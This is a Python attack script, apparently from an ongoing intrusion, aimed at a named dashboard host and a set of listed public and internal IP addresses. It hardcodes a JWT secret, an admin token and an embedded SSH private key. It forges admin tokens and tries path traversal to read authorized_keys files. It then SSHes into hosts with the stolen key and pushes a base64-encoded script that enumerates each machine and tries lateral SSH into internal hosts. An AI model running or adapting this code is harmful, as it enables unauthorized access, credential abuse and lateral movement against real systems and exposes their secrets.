#!/usr/bin/env python3
# i29507 Round E2: diagnose dashboard 401 + find surviving direct pivot (7 PUB-persisting hosts) + mesh keys
import os, sys, json, base64, hmac, hashlib, subprocess, random, time, re, urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AUID = "fc7c3730-4219-11f1-ac43-525400595be1"
PUB = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHUkDMN8EmdvUuS35ygDjn8v74reVaHPncVJZ2ERa1rh"
PRIV = base64.b64decode("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0egpjMmd0WldReU5UVXhPUUFBQUNCMUpBekRmQkpuYjFMa3QrY29BNDUvTCsrSzNsV2h6NTNGU1dkaEVXdGE0UUFBCkFJaFNkVlBOVW5WVHpRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQjFKQXpEZkJKbmIxTGt0K2NvQTQ1L0wrK0sKM2xXaHo1M0ZTV2RoRVd0YTRRQUFBRURpcDRnNFQ2Tmprc0VYRG9nK1l0UGlFaDdFR1ZRUXJmQXdaZjBYUGtiWQpTblVrRE1OOEVtZHZVdVMzNXlnRGpuOHY3NHJlVmFIUG5jVkpaMkVSYTFyaEFBQUFBQUVDQXdRRgotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K")
# 7 hosts whose authorized_keys kept PUB (Round C originals were empty -> never restored)
PUBHOSTS = [("intelora13","3.1.85.40"),("intelora10","18.140.62.25"),("intelora6","13.229.229.119"),
            ("lumii5","175.41.162.110"),("intelora5","18.141.143.76"),("lumii2","13.250.122.46")]
INTERNAL5 = ["172.31.17.162","172.31.26.221","172.31.19.141","172.31.20.106","172.31.31.153"]
LUMII3_INT = "172.31.23.93"

MESH = r'''#!/bin/bash
exec 2>/dev/null </dev/null
export LC_ALL=C
H=$(hostname); echo "### $H"; id 2>&1
echo "--routes--"; ip route 2>/dev/null | head -8
echo "--hosts--"; cat /etc/hosts 2>/dev/null | tail -15
echo "--selfmesh--"
for ip in __INT5__ __LUMII3__; do
  for u in coder ubuntu; do
    R=$(timeout 5 ssh -n -i ~/.ssh/id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=2 "$u@$ip" "echo OK; hostname" 2>/dev/null)
    [ -n "$R" ] && echo "MESHOK $u@$ip :: $(echo "$R" | tr "\n" ";")"
  done
done
echo "--keys--"; ls -la ~/.ssh 2>/dev/null
echo "###END $H"
'''

def sh(a, timeout=120):
    try:
        r = subprocess.run(a, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8","replace"), r.stderr.decode("utf-8","replace")
    except Exception as e:
        return -1, "", repr(e)

def curl(args, timeout=40):
    return sh(["curl","-s","-k","-m",str(timeout)]+args, timeout=timeout+20)

def b64(s):
    if isinstance(s,bytes): s=s.decode("utf-8","replace")
    return base64.b64encode(s.encode("utf-8","replace")).decode()

def R(k,v):
    s = v if isinstance(v,str) else json.dumps(v,ensure_ascii=False,default=str)
    b=b64(s)
    if len(b)<=8500: print("R:%s:%s"%(k,b),flush=True)
    else:
        for i in range(0,len(b),8500): print("R:%s__%02d:%s"%(k,i//8500,b[i:i+8500]),flush=True)

def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def jwt(p, secret):
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    pl=b64u(json.dumps(p,separators=(",",":")))
    return h+"."+pl+"."+b64u(hmac.new(secret.encode(),(h+pl).encode(),hashlib.sha256).digest())

def call(path, tok=None, bearer=None, cookieName="session", timeout=30):
    args=["--http2","-A",UA,"-H","Accept: application/json, text/plain, */*","-w","\n__CODE__%{http_code}"]
    if tok: args+=["-H","Cookie: %s=%s"%(cookieName,tok)]
    if bearer: args+=["-H","Authorization: Bearer "+bearer]
    args+=["https://%s%s"%(HOST,path)]
    rc,out,err=curl(args,timeout=timeout)
    i=out.rfind("__CODE__"); code=out[i+8:].strip()[:3] if i>=0 else ""
    body=out[:i] if i>=0 else out
    return {"code":code,"body":body[:1200]}

def main():
    now=int(time.time())
    fr_plain = jwt({"userId":AUID,"email":"brian@x","customer":"aro","role":"admin"}, JWT_SECRET)
    fr_exp   = jwt({"userId":AUID,"email":"brian@x","customer":"aro","role":"admin","iat":now,"exp":now+7200}, JWT_SECRET)
    fr_gold  = jwt({"userId":"bc09d9cc-63b0-11f1-ac43-525400595be1","email":"probe@x","customer":"goldenyears","role":"admin","iat":now,"exp":now+7200}, JWT_SECRET)
    P="/api/agents/agent-8c6ac8b3/files?action=read&path=%2Fhome%2Flumii%2F.lumii-agent-keeper%2F..%2F.ssh%2Fauthorized_keys"
    Q="/api/agents/agent-047f1d22/files?action=read&path=%2Fhome%2Flumii%2F.lumii-agent-keeper%2F..%2F.ssh%2Fauthorized_keys"
    tests={}
    for name,path,kw in [
        ("plain_cookie_aro",P,{"tok":fr_plain}),
        ("exp_cookie_aro",P,{"tok":fr_exp}),
        ("exp_bearer_aro",P,{"bearer":fr_exp}),
        ("gold_cookie",P,{"tok":fr_gold}),
        ("adm_bearer",P,{"bearer":ADMIN_TOKEN}),
        ("adm_cookie",P,{"tok":ADMIN_TOKEN}),
        ("plain_cookie_lumii3_aro",Q,{"tok":fr_plain}),
        ("exp_cookie_lumii3_aro",Q,{"tok":fr_exp}),
        ("adm_bearer_lumii3",Q,{"bearer":ADMIN_TOKEN}),
    ]:
        try: tests[name]=call(path,**kw)
        except Exception as e: tests[name]="ERR:"+repr(e)[:120]
    # also assistant plane to test secret
    try:
        r=call("/api/me", tok=fr_plain)  # will hit dashboard host; not assistant — informational
        tests["dash_me_cookie"]=r
    except Exception as e: tests["dash_me_cookie"]=repr(e)[:120]
    R("AUTH", tests)

    kp="/tmp/k29507b"; open(kp,"wb").write(PRIV); os.chmod(kp,0o600)
    script = MESH.replace("__INT5__", " ".join(INTERNAL5)).replace("__LUMII3__", LUMII3_INT)
    hb = base64.b64encode(script.encode()).decode()
    # A) direct public-IP ssh with PUB/PRIV
    pubres={}
    live=[]
    for host,ip in PUBHOSTS:
        rc,out,err = sh(["ssh","-i",kp,"-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=8","-n",
                         "coder@"+ip,"id;hostname;sudo -n id 2>&1|head -1"],timeout=30)
        pubres["%s@%s"%(host,ip)]={"rc":rc,"out":out[-300:],"err":err[-200:]}
        if rc==0: live.append((host,ip))
    R("PUBSSH", pubres)
    R("LIVE", [h+":"+i for h,i in live])
    # B) from any live host, mesh-test internal5 + lumii3 with the host's own id_ed25519
    meshres={}
    for host,ip in live[:3]:
        cmd = "echo %s | base64 -d > /tmp/m.sh; bash /tmp/m.sh" % hb
        rc,out,err = sh(["ssh","-i",kp,"-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=8","-n",
                         "coder@"+ip,cmd],timeout=160)
        meshres[host]={"rc":rc,"out":out[-4000:],"err":err[-300:]}
    R("MESH", meshres)

try:
    main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-2500:])
finally:
    sys.exit(1)
